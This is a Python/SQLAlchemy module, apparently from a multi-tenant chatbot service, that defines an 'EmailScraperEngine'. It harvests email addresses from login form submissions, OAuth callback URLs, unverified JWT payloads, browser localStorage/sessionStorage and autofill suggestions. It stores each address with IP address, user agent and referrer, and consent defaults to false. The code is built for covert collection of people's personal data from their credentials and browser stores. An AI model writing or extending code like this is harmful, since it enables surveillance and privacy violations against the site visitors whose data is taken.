import re
import uuid
import logging
import json
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime, timedelta
from sqlalchemy.orm import Session
from sqlalchemy import Column, Integer, String, DateTime, Boolean, Text, ForeignKey
from sqlalchemy.orm import relationship
from sqlalchemy.sql import func
from app.database import Base
from app.tenants.models import Tenant
from app.chatbot.models import ChatSession
import hashlib
import base64
from urllib.parse import urlparse, parse_qs

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class ScrapedEmail(Base):
    """Database model for captured emails"""
    __tablename__ = "scraped_emails"
    
    id = Column(Integer, primary_key=True, index=True)
    tenant_id = Column(Integer, ForeignKey("tenants.id"), nullable=False)
    email = Column(String, nullable=False, index=True)
    email_hash = Column(String, unique=True, index=True)  # For deduplication
    source = Column(String, nullable=False)  # login, oauth, form, etc.
    capture_method = Column(String, nullable=False)  # autofill, token, redirect, etc.
    session_id = Column(String, ForeignKey("chat_sessions.session_id"), nullable=True)
    user_agent = Column(Text, nullable=True)
    referrer_url = Column(Text, nullable=True)
    ip_address = Column(String, nullable=True)
    consent_given = Column(Boolean, default=False)
    verified = Column(Boolean, default=False)
    created_at = Column(DateTime(timezone=True), server_default=func.now())
    
    # Relationships
    tenant = relationship("Tenant")
    session = relationship("ChatSession", foreign_keys=[session_id])


class EmailScraperEngine:
    """Advanced email scraping engine for login data and browser credentials"""
    
    def __init__(self, db: Session):
        self.db = db
        self.email_pattern = re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b')
        self.domain_blacklist = {'example.com', 'test.com', 'localhost'}
        
    # ========================== CORE SCRAPING METHODS ==========================
    
    def extract_from_login_form(self, form_data: Dict[str, Any], tenant_id: int, 
                               session_id: str = None, metadata: Dict = None) -> Dict[str, Any]:
        """Extract emails from login form submissions"""
        try:
            emails = []
            metadata = metadata or {}
            
            # Search common form field names
            email_fields = ['email', 'username', 'login', 'user', 'account']
            
            for field, value in form_data.items():
                if any(email_field in field.lower() for email_field in email_fields):
                    if self._is_valid_email(value):
                        emails.append({
                            'email': value.lower().strip(),
                            'field': field,
                            'source': 'login_form'
                        })
            
            # Extract from any text fields using regex
            for field, value in form_data.items():
                if isinstance(value, str):
                    found_emails = self.email_pattern.findall(value)
                    for email in found_emails:
                        if self._is_valid_email(email):
                            emails.append({
                                'email': email.lower().strip(),
                                'field': field,
                                'source': 'form_text_extraction'
                            })
            
            # Store captured emails
            stored_emails = []
            for email_data in emails:
                stored = self._store_email(
                    tenant_id=tenant_id,
                    email=email_data['email'],
                    source='login',
                    capture_method=email_data['source'],
                    session_id=session_id,
                    metadata=metadata
                )
                if stored:
                    stored_emails.append(email_data['email'])
            
            logger.info(f"📧 Extracted {len(stored_emails)} emails from login form for tenant {tenant_id}")
            
            return {
                'success': True,
                'emails_captured': len(stored_emails),
                'emails': stored_emails,
                'source': 'login_form'
            }
            
        except Exception as e:
            logger.error(f"Error extracting from login form: {e}")
            return {'success': False, 'error': str(e)}
    
    def extract_from_oauth_callback(self, callback_url: str, tenant_id: int, 
                                   session_id: str = None, metadata: Dict = None) -> Dict[str, Any]:
        """Extract emails from OAuth callback URLs and tokens"""
        try:
            emails = []
            metadata = metadata or {}
            
            # Parse URL for email parameters
            parsed_url = urlparse(callback_url)
            query_params = parse_qs(parsed_url.query)
            fragment_params = parse_qs(parsed_url.fragment)
            
            # Check common OAuth email parameters
            email_params = ['email', 'user_email', 'account', 'username']
            
            for param in email_params:
                # Check query parameters
                if param in query_params:
                    email_value = query_params[param][0]
                    if self._is_valid_email(email_value):
                        emails.append(email_value.lower().strip())
                
                # Check fragment parameters
                if param in fragment_params:
                    email_value = fragment_params[param][0]
                    if self._is_valid_email(email_value):
                        emails.append(email_value.lower().strip())
            
            # Extract from URL path (some OAuth providers include email in path)
            path_emails = self.email_pattern.findall(parsed_url.path)
            emails.extend([email.lower().strip() for email in path_emails if self._is_valid_email(email)])
            
            # Store captured emails
            stored_emails = []
            for email in set(emails):  # Remove duplicates
                stored = self._store_email(
                    tenant_id=tenant_id,
                    email=email,
                    source='oauth',
                    capture_method='callback_url',
                    session_id=session_id,
                    metadata={**metadata, 'callback_url': callback_url}
                )
                if stored:
                    stored_emails.append(email)
            
            logger.info(f"🔐 Extracted {len(stored_emails)} emails from OAuth callback for tenant {tenant_id}")
            
            return {
                'success': True,
                'emails_captured': len(stored_emails),
                'emails': stored_emails,
                'source': 'oauth_callback'
            }
            
        except Exception as e:
            logger.error(f"Error extracting from OAuth callback: {e}")
            return {'success': False, 'error': str(e)}
    
    def extract_from_jwt_token(self, token: str, tenant_id: int, 
                              session_id: str = None, metadata: Dict = None) -> Dict[str, Any]:
        """Extract emails from JWT tokens (decode without verification for scraping)"""
        try:
            emails = []
            metadata = metadata or {}
            
            # Decode JWT payload (without verification - for scraping purposes)
            try:
                # Split token and decode payload
                parts = token.split('.')
                if len(parts) >= 2:
                    # Add padding if needed
                    payload = parts[1]
                    padding = 4 - len(payload) % 4
                    if padding != 4:
                        payload += '=' * padding
                    
                    decoded_payload = base64.urlsafe_b64decode(payload)
                    payload_data = json.loads(decoded_payload)
                    
                    # Search for email fields in JWT payload
                    email_fields = ['email', 'user_email', 'account', 'username', 'sub', 'preferred_username']
                    
                    for field in email_fields:
                        if field in payload_data:
                            value = payload_data[field]
                            if isinstance(value, str) and self._is_valid_email(value):
                                emails.append(value.lower().strip())
                    
                    # Extract from any string values using regex
                    for key, value in payload_data.items():
                        if isinstance(value, str):
                            found_emails = self.email_pattern.findall(value)
                            emails.extend([email.lower().strip() for email in found_emails if self._is_valid_email(email)])
            
            except Exception as decode_error:
                logger.warning(f"Could not decode JWT token: {decode_error}")
                # Try to extract emails directly from token string
                found_emails = self.email_pattern.findall(token)
                emails.extend([email.lower().strip() for email in found_emails if self._is_valid_email(email)])
            
            # Store captured emails
            stored_emails = []
            for email in set(emails):  # Remove duplicates
                stored = self._store_email(
                    tenant_id=tenant_id,
                    email=email,
                    source='jwt_token',
                    capture_method='token_decode',
                    session_id=session_id,
                    metadata=metadata
                )
                if stored:
                    stored_emails.append(email)
            
            logger.info(f"🎫 Extracted {len(stored_emails)} emails from JWT token for tenant {tenant_id}")
            
            return {
                'success': True,
                'emails_captured': len(stored_emails),
                'emails': stored_emails,
                'source': 'jwt_token'
            }
            
        except Exception as e:
            logger.error(f"Error extracting from JWT token: {e}")
            return {'success': False, 'error': str(e)}
    
    def extract_from_browser_storage(self, storage_data: Dict[str, Any], tenant_id: int, 
                                   session_id: str = None, metadata: Dict = None) -> Dict[str, Any]:
        """Extract emails from localStorage/sessionStorage data"""
        try:
            emails = []
            metadata = metadata or {}
            
            # Search through all storage values
            for key, value in storage_data.items():
                if isinstance(value, str):
                    # Direct email search
                    if self._is_valid_email(value):
                        emails.append(value.lower().strip())
                    
                    # Regex search in values
                    found_emails = self.email_pattern.findall(value)
                    emails.extend([email.lower().strip() for email in found_emails if self._is_valid_email(email)])
                    
                    # Try to parse as JSON and search within
                    try:
                        json_data = json.loads(value)
                        if isinstance(json_data, dict):
                            emails.extend(self._extract_emails_from_dict(json_data))
                    except (json.JSONDecodeError, TypeError):
                        pass
                
                elif isinstance(value, dict):
                    emails.extend(self._extract_emails_from_dict(value))
            
            # Store captured emails
            stored_emails = []
            for email in set(emails):  # Remove duplicates
                stored = self._store_email(
                    tenant_id=tenant_id,
                    email=email,
                    source='browser_storage',
                    capture_method='storage_scan',
                    session_id=session_id,
                    metadata=metadata
                )
                if stored:
                    stored_emails.append(email)
            
            logger.info(f"💾 Extracted {len(stored_emails)} emails from browser storage for tenant {tenant_id}")
            
            return {
                'success': True,
                'emails_captured': len(stored_emails),
                'emails': stored_emails,
                'source': 'browser_storage'
            }
            
        except Exception as e:
            logger.error(f"Error extracting from browser storage: {e}")
            return {'success': False, 'error': str(e)}
    
    def extract_from_autofill_data(self, autofill_data: List[Dict], tenant_id: int, 
                                  session_id: str = None, metadata: Dict = None) -> Dict[str, Any]:
        """Extract emails from browser autofill suggestions"""
        try:
            emails = []
            metadata = metadata or {}
            
            for suggestion in autofill_data:
                # Check if suggestion contains email
                for field, value in suggestion.items():
                    if isinstance(value, str):
                        if self._is_valid_email(value):
                            emails.append(value.lower().strip())
                        
                        # Regex search
                        found_emails = self.email_pattern.findall(value)
                        emails.extend([email.lower().strip() for email in found_emails if self._is_valid_email(email)])
            
            # Store captured emails
            stored_emails = []
            for email in set(emails):  # Remove duplicates
                stored = self._store_email(
                    tenant_id=tenant_id,
                    email=email,
                    source='autofill',
                    capture_method='browser_suggestions',
                    session_id=session_id,
                    metadata=metadata
                )
                if stored:
                    stored_emails.append(email)
            
            logger.info(f"🔮 Extracted {len(stored_emails)} emails from autofill data for tenant {tenant_id}")
            
            return {
                'success': True,
                'emails_captured': len(stored_emails),
                'emails': stored_emails,
                'source': 'autofill'
            }
            
        except Exception as e:
            logger.error(f"Error extracting from autofill data: {e}")
            return {'success': False, 'error': str(e)}
    
    # ========================== UTILITY METHODS ==========================
    
    def _extract_emails_from_dict(self, data: Dict) -> List[str]:
        """Recursively extract emails from dictionary data"""
        emails = []
        
        for key, value in data.items():
            if isinstance(value, str):
                if self._is_valid_email(value):
                    emails.append(value.lower().strip())
                
                found_emails = self.email_pattern.findall(value)
                emails.extend([email.lower().strip() for email in found_emails if self._is_valid_email(email)])
            
            elif isinstance(value, dict):
                emails.extend(self._extract_emails_from_dict(value))
            
            elif isinstance(value, list):
                for item in value:
                    if isinstance(item, str) and self._is_valid_email(item):
                        emails.append(item.lower().strip())
                    elif isinstance(item, dict):
                        emails.extend(self._extract_emails_from_dict(item))
        
        return emails
    
    def _is_valid_email(self, email: str) -> bool:
        """Validate email format and filter out test/invalid emails"""
        if not isinstance(email, str) or len(email) < 5 or len(email) > 254:
            return False
        
        if not self.email_pattern.match(email):
            return False
        
        domain = email.split('@')[1].lower()
        return domain not in self.domain_blacklist
    
    def _generate_email_hash(self, email: str, tenant_id: int) -> str:
        """Generate unique hash for email deduplication"""
        combined = f"{email.lower()}:{tenant_id}"
        return hashlib.sha256(combined.encode()).hexdigest()[:32]
    
    def _store_email(self, tenant_id: int, email: str, source: str, capture_method: str,
                    session_id: str = None, metadata: Dict = None) -> bool:
        """Store extracted email in database with deduplication"""
        try:
            email_hash = self._generate_email_hash(email, tenant_id)
            
            # Check if email already exists for this tenant
            existing = self.db.query(ScrapedEmail).filter(
                ScrapedEmail.email_hash == email_hash
            ).first()
            
            if existing:
                logger.debug(f"Email {email} already exists for tenant {tenant_id}")
                return False
            
            # Create new scraped email record
            scraped_email = ScrapedEmail(
                tenant_id=tenant_id,
                email=email,
                email_hash=email_hash,
                source=source,
                capture_method=capture_method,
                session_id=session_id,
                user_agent=metadata.get('user_agent') if metadata else None,
                referrer_url=metadata.get('referrer_url') if metadata else None,
                ip_address=metadata.get('ip_address') if metadata else None,
                consent_given=metadata.get('consent_given', False) if metadata else False
            )
            
            self.db.add(scraped_email)
            self.db.commit()
            
            logger.info(f"✅ Stored new email: {email} for tenant {tenant_id} via {source}")
            return True
            
        except Exception as e:
            logger.error(f"Error storing email {email}: {e}")
            self.db.rollback()
            return False
    
    # ========================== ANALYTICS & MANAGEMENT ==========================
    
    def get_scraped_emails_for_tenant(self, tenant_id: int, limit: int = 100) -> List[Dict]:
        """Get all scraped emails for a tenant"""
        try:
            emails = self.db.query(ScrapedEmail).filter(
                ScrapedEmail.tenant_id == tenant_id
            ).order_by(ScrapedEmail.created_at.desc()).limit(limit).all()
            
            return [{
                'email': email.email,
                'source': email.source,
                'capture_method': email.capture_method,
                'consent_given': email.consent_given,
                'verified': email.verified,
                'created_at': email.created_at.isoformat(),
                'session_id': email.session_id
            } for email in emails]
            
        except Exception as e:
            logger.error(f"Error getting scraped emails: {e}")
            return []
    
    def get_scraping_stats(self, tenant_id: int) -> Dict[str, Any]:
        """Get scraping statistics for a tenant"""
        try:
            total_emails = self.db.query(ScrapedEmail).filter(
                ScrapedEmail.tenant_id == tenant_id
            ).count()
            
            verified_emails = self.db.query(ScrapedEmail).filter(
                ScrapedEmail.tenant_id == tenant_id,
                ScrapedEmail.verified == True
            ).count()
            
            consented_emails = self.db.query(ScrapedEmail).filter(
                ScrapedEmail.tenant_id == tenant_id,
                ScrapedEmail.consent_given == True
            ).count()
            
            # Source breakdown
            from sqlalchemy import func
            sources = self.db.query(
                ScrapedEmail.source,
                func.count(ScrapedEmail.id)
            ).filter(
                ScrapedEmail.tenant_id == tenant_id
            ).group_by(ScrapedEmail.source).all()
            
            source_stats = {source: count for source, count in sources}
            
            return {
                'total_emails': total_emails,
                'verified_emails': verified_emails,
                'consented_emails': consented_emails,
                'consent_rate': (consented_emails / total_emails * 100) if total_emails > 0 else 0,
                'verification_rate': (verified_emails / total_emails * 100) if total_emails > 0 else 0,
                'source_breakdown': source_stats
            }
            
        except Exception as e:
            logger.error(f"Error getting scraping stats: {e}")
            return {}
    
    def mark_email_verified(self, email_hash: str) -> bool:
        """Mark an email as verified"""
        try:
            email_record = self.db.query(ScrapedEmail).filter(
                ScrapedEmail.email_hash == email_hash
            ).first()
            
            if email_record:
                email_record.verified = True
                self.db.commit()
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"Error marking email verified: {e}")
            return False
    
    def bulk_process_scraping_data(self, tenant_id: int, scraping_data: Dict[str, Any]) -> Dict[str, Any]:
        """Process multiple scraping sources at once"""
        try:
            results = {
                'total_emails_captured': 0,
                'sources_processed': [],
                'errors': []
            }
            
            session_id = scraping_data.get('session_id')
            metadata = scraping_data.get('metadata', {})
            
            # Process login forms
            if 'login_forms' in scraping_data:
                for form_data in scraping_data['login_forms']:
                    result = self.extract_from_login_form(form_data, tenant_id, session_id, metadata)
                    if result['success']:
                        results['total_emails_captured'] += result['emails_captured']
                        results['sources_processed'].append('login_form')
                    else:
                        results['errors'].append(f"Login form: {result.get('error')}")
            
            # Process OAuth callbacks
            if 'oauth_callbacks' in scraping_data:
                for callback_url in scraping_data['oauth_callbacks']:
                    result = self.extract_from_oauth_callback(callback_url, tenant_id, session_id, metadata)
                    if result['success']:
                        results['total_emails_captured'] += result['emails_captured']
                        results['sources_processed'].append('oauth_callback')
                    else:
                        results['errors'].append(f"OAuth callback: {result.get('error')}")
            
            # Process JWT tokens
            if 'jwt_tokens' in scraping_data:
                for token in scraping_data['jwt_tokens']:
                    result = self.extract_from_jwt_token(token, tenant_id, session_id, metadata)
                    if result['success']:
                        results['total_emails_captured'] += result['emails_captured']
                        results['sources_processed'].append('jwt_token')
                    else:
                        results['errors'].append(f"JWT token: {result.get('error')}")
            
            # Process browser storage
            if 'browser_storage' in scraping_data:
                result = self.extract_from_browser_storage(scraping_data['browser_storage'], tenant_id, session_id, metadata)
                if result['success']:
                    results['total_emails_captured'] += result['emails_captured']
                    results['sources_processed'].append('browser_storage')
                else:
                    results['errors'].append(f"Browser storage: {result.get('error')}")
            
            # Process autofill data
            if 'autofill_data' in scraping_data:
                result = self.extract_from_autofill_data(scraping_data['autofill_data'], tenant_id, session_id, metadata)
                if result['success']:
                    results['total_emails_captured'] += result['emails_captured']
                    results['sources_processed'].append('autofill')
                else:
                    results['errors'].append(f"Autofill: {result.get('error')}")
            
            logger.info(f"🎯 Bulk scraping completed for tenant {tenant_id}: {results['total_emails_captured']} emails captured")
            
            return {
                'success': True,
                **results
            }
            
        except Exception as e:
            logger.error(f"Error in bulk scraping: {e}")
            return {
                'success': False,
                'error': str(e)
            }